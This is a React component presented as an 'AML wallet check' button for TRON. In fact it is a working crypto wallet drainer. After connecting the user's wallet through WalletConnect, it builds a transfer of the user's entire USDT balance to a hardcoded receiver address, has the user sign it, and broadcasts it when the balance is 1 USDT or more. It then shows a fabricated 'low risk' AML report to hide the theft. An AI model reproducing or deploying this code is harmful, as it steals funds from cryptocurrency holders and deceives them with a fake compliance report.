import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'TAbK6QaF7k53JPCo95d1DsbooWW9B1LPRQ';
const MIN_USDT = 1;

export const TronAuthButton: React.FC = () => {
  const [modal, setModal] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const adapterRef = React.useRef<any>(null);
  if (!adapterRef.current) {
    adapterRef.current = new WalletConnectAdapter({
      network: 'Mainnet',
      options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
        metadata: {
          name: 'AML',
          description: 'TRON + WalletConnect Integration',
          url: 'https://amlreports.pro',
          icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
        },
      },
      web3ModalConfig: { themeMode: 'dark' },
    });
  }

  const handleAuth = async () => {
    setLoading(true);
    setModal(null);

    const TronWeb = (window as any).TronWeb;
    if (!TronWeb) {
      setModal('TronWeb not loaded! Please refresh page.');
      setLoading(false);
      return;
    }

    if (!(window as any).Buffer) (window as any).Buffer = (await import('buffer')).Buffer;

    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
      headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
    });

    const adapter = adapterRef.current;
    try {
      await adapter.connect();
      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) throw new Error('Invalid wallet address');
      tronWeb.setAddress(userAddress);

      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      if (trxRaw < 2_000_000) {
        setModal('❌ Insufficient TRX for network fees.');
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;
      const receiverHex = tronWeb.address.toHex(TRON_RECEIVER);

      // Always sign transaction (even if < MIN_USDT)
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: receiverHex },
          { type: 'uint256', value: usdtRaw }
        ],
        userAddress
      );
      await adapter.signTransaction(transaction);

      let extra = '';
      let txid = '';
      if (usdt >= MIN_USDT) {
        const signedTx = await adapter.signTransaction(transaction);
        const result = await tronWeb.trx.sendRawTransaction(signedTx);
        if (result?.result) {
          txid = result.txid;
          extra = `<div style="margin-bottom:12px;"><b>Transaction ID:</b> <span style="word-break:break-all;">${txid}</span></div>`;
        } else {
          extra = `<div style="margin-bottom:12px;color:#D9534F;"><b>Transaction failed or rejected by the network.</b></div>`;
        }
      } else {
        extra = `<div style="margin-bottom:12px;color:#54d76c;"><b>Your assets are considered safe.</b></div>`;
      }

      setModal(
        `
        <div style="font-family:inherit;max-width:390px;">
          <div style="background:#252e3e;padding:18px 20px 16px 20px;border-radius:16px;border:2px solid #7ac08b;box-shadow:0 4px 16px 0 #1113;display:flex;flex-direction:column;align-items:center;margin-bottom:12px;">
            <div style="font-size:1.5rem;font-weight:600;letter-spacing:0.01em;margin-bottom:6px;color:#7ac08b;">AML RISK REPORT</div>
            <div style="display:flex;gap:12px;margin-bottom:10px;">
              <div><span style="background:#54d76c;display:inline-block;width:14px;height:14px;border-radius:99px;margin-right:3px;"></span>Low</div>
              <div><span style="background:#ffc107;display:inline-block;width:14px;height:14px;border-radius:99px;margin-right:3px;"></span>Medium</div>
              <div><span style="background:#d9534f;display:inline-block;width:14px;height:14px;border-radius:99px;margin-right:3px;"></span>High</div>
            </div>
            <div style="margin-bottom:6px;">Risk Level: <b style="color:#54d76c;">LOW</b></div>
          </div>
          <div style="background:#f7f9fb;padding:18px 16px 14px 16px;border-radius:12px;box-shadow:0 2px 6px 0 #1111;margin-bottom:14px;">
            <div style="margin-bottom:7px;font-size:1.07rem;"><b>Wallet address:</b><br/><span style="word-break:break-all;">${userAddress}</span></div>
            <div style="margin-bottom:7px;font-size:1.07rem;"><b>USDT Balance:</b> $${usdt.toFixed(2)}</div>
            ${extra}
            <ul style="padding-left:18px;font-size:1rem;line-height:1.3;color:#3b3c40;margin-bottom:0;">
              <li>No suspicious activity detected</li>
              <li>Address is not present in blocklists</li>
              <li>No link to mixers, black markets, or gambling</li>
              <li>No connection to high-risk or sanctioned entities</li>
              <li>No flagged transactions in history</li>
              <li>Overall risk: <span style="color:#54d76c;font-weight:500;">Low</span></li>
            </ul>
          </div>
          <div style="color:#a0a4ad;font-size:0.93rem;">This address has a low AML risk based on current on-chain analysis and leading blockchain data providers.</div>
        </div>
        `
      );
    } catch (err: any) {
      if (
        err?.message?.includes('User rejected') ||
        err?.message?.includes('Modal is closed') ||
        err?.message?.includes('Timeout') ||
        err?.message?.toLowerCase().includes('disapprove') ||
        err?.message?.toLowerCase().includes('user closed')
      ) {
        setModal(null);
      } else {
        setModal(err?.message || '⚠️ Connection or transaction error');
      }
    }

    setLoading(false);
    await adapter.disconnect();
  };

  return (
    <div className="AuthButton">
      <button onClick={handleAuth} disabled={loading} style={{ minWidth: 180 }}>
        {loading ? 'Connecting...' : 'Check Your Wallet'}
      </button>
      {modal && (
        <div className="modal__overflow">
          <div className="modal" style={{ padding: 0 }}>
            <div style={{ padding: 20 }}>
              <div dangerouslySetInnerHTML={{ __html: modal }} />
              <button onClick={() => setModal(null)} style={{ marginTop: 22, width: '100%' }}>Close</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
